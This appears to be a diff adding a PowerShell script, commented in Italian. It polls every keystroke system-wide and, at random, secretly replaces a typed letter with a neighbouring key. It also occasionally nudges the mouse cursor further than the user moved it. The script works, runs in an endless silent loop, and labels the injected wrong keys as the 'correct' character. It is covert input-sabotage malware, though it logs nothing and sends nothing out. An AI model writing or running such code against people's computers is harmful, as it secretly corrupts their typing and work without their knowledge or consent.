@@ -1,0 +1,123 @@
+Add-Type -AssemblyName System.Windows.Forms
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32 {
+    [StructLayout(LayoutKind.Sequential)]
+    public struct POINT {
+        public int X;
+        public int Y;
+    }
+
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
+
+    [DllImport("user32.dll")]
+    public static extern bool GetCursorPos(ref POINT pt);
+
+    [DllImport("user32.dll")]
+    public static extern bool SetCursorPos(int X, int Y);
+}
+"@
+
+$adjacency = @{
+    'a' = @('s', 'q', 'z')
+    'b' = @('v', 'g', 'h', 'n')
+    'c' = @('x', 'd', 'f', 'v')
+    'd' = @('s', 'e', 'r', 'f', 'c', 'x')
+    'e' = @('w', 's', 'd', 'r')
+    'f' = @('d', 'r', 't', 'g', 'v', 'c')
+    'g' = @('f', 't', 'y', 'h', 'b', 'v')
+    'h' = @('g', 'y', 'u', 'j', 'n', 'b')
+    'i' = @('u', 'j', 'k', 'o')
+    'j' = @('h', 'u', 'i', 'k', 'm', 'n')
+    'k' = @('j', 'i', 'o', 'l', 'm')
+    'l' = @('k', 'o', 'p')
+    'm' = @('n', 'j', 'k')
+    'n' = @('b', 'h', 'j', 'm')
+    'o' = @('i', 'k', 'l', 'p')
+    'p' = @('o', 'l')
+    'q' = @('a', 's', 'w')
+    'r' = @('e', 'd', 'f', 't')
+    's' = @('a', 'w', 'e', 'd', 'x', 'z')
+    't' = @('r', 'f', 'g', 'y')
+    'u' = @('y', 'h', 'j', 'i')
+    'v' = @('c', 'f', 'g', 'b')
+    'w' = @('q', 'a', 's', 'e')
+    'x' = @('z', 's', 'd', 'c')
+    'y' = @('t', 'g', 'h', 'u')
+    'z' = @('a', 's', 'x')
+}
+
+# Variabile per memorizzare la posizione precedente del mouse
+$previousPos = New-Object Win32+POINT
+[Win32]::GetCursorPos([ref]$previousPos) | Out-Null
+
+while ($true) {
+    Start-Sleep -Milliseconds 20
+
+    # Gestione typo con probabilità molto bassa (~0.1%)
+    for ($vkCode = 0x30; $vkCode -le 0x5A; $vkCode++) {
+        $state = [Win32]::GetAsyncKeyState($vkCode)
+        if ($state -band 0x8000) {
+            $keyChar = [char]$vkCode
+            $keyLower = $keyChar.ToString().ToLower()
+
+            if ($adjacency.ContainsKey($keyLower) -and (Get-Random -Minimum 1 -Maximum 1000) -le 1) {
+                $adj = $adjacency[$keyLower]
+                if ($adj.Count -gt 0) {
+                    $replacement = $adj | Get-Random
+
+                    # Cancella il carattere digitato
+                    [System.Windows.Forms.SendKeys]::SendWait("{BS}")
+
+                    # Invia il carattere corretto mantenendo maiuscole/minuscole
+                    if ($keyChar.ToString() -eq $keyLower) {
+                        [System.Windows.Forms.SendKeys]::SendWait($replacement)
+                    }
+                    else {
+                        [System.Windows.Forms.SendKeys]::SendWait($replacement.ToUpper())
+                    }
+                }
+            }
+        }
+    }
+
+    # Ottieni posizione corrente mouse
+    $currentPos = New-Object Win32+POINT
+    if ([Win32]::GetCursorPos([ref]$currentPos)) {
+        # Calcola differenza di posizione
+        $dx = $currentPos.X - $previousPos.X
+        $dy = $currentPos.Y - $previousPos.Y
+
+        # Se il mouse si sta muovendo (anche minimo)
+        if (($dx -ne 0) -or ($dy -ne 0)) {
+
+            # Muove il mouse leggermente in più mantenendo direzione e velocità iniziale
+            # Scivolamento = aggiunta di un piccolo delta nella stessa direzione
+            $slideProbability = 1 # 1% probabilità
+            if ((Get-Random -Minimum 1 -Maximum 100) -le $slideProbability) {
+                # Calcola incremento scivolamento (piccolo)
+                $slideFactor = 0.1 # 10% della distanza spostata
+                $slideX = [Math]::Round($dx * $slideFactor)
+                $slideY = [Math]::Round($dy * $slideFactor)
+
+                # Aggiunge una variazione random per sembrare naturale
+                $slideX += (Get-Random -Minimum -1 -Maximum 1)
+                $slideY += (Get-Random -Minimum -1 -Maximum 1)
+
+                # Nuova posizione per il cursore (scivolamento)
+                $newX = $currentPos.X + $slideX
+                $newY = $currentPos.Y + $slideY
+
+                # Imposta nuova posizione del cursore
+                [Win32]::SetCursorPos($newX, $newY) | Out-Null
+            }
+
+            # Aggiorna la posizione precedente
+            $previousPos = $currentPos
+        }
+    }
+}
